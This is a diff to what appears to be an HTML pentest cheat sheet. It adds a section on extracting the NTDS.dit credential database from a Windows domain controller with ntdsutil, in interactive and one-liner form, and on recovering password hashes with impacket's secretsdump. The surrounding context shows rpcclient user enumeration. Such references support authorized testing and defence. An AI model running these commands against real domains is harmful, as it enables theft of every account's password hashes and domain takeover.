@@ -135,6 +135,14 @@
     </ul>
     
 
+    
+    <ul>
+    
+        <li><a class="" href="#ntdsutil">ntdsutil</a></li>
+    
+    </ul>
+    
+
     </ul>
                 </li>
                 <li class="">
@@ -602,6 +610,22 @@ with <code>rpcclient</code>:</p>
 <pre><code class="language-bash">rpcclient -U '' &lt;host&gt;
 rpcclient $&gt; enumdomusers
 rpcclient $&gt; queryuser &lt;user&gt;
+</code></pre>
+<h2 id="extract-ntds-from-a-domain-controller">Extract NTDS from a domain controller</h2>
+<h3 id="ntdsutil">ntdsutil</h3>
+<p>On a DC, open a cmd shell:</p>
+<pre><code class="language-batch">ntdsutil
+activate instance ntds
+ifm
+create full C:\ntds.dit
+quit
+quit
+</code></pre>
+<p>If you have a remote shell, you can also use the one-liner:</p>
+<pre><code class="language-batch">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\ntds.dit&quot; q q
+</code></pre>
+<p>On your machine, use <code>impacket</code> to recover the hashes:</p>
+<pre><code class="language-bash">python secretsdump.py -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL -outputfile &lt;output&gt; -pwd-last-set -user-status -history
 </code></pre>
             
           </div>
